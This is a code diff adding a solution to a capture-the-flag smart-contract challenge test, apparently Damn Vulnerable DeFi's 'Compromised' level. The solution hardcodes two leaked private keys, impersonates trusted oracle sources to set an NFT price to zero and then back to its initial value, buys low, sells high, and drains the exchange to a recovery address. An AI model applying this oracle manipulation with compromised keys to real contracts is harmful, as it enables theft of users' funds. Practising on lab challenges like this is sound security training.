@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,28 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address wallet1 = vm.addr(pk1);
+        address wallet2 = vm.addr(pk2);
+
+        vm.prank(wallet1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(wallet2);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(player);
+        exchange.buyOne{value: 0.1 ether}();
+
+        vm.prank(wallet1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(wallet2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        recovery.call{value: INITIAL_NFT_PRICE}("");
     }
 
     /**
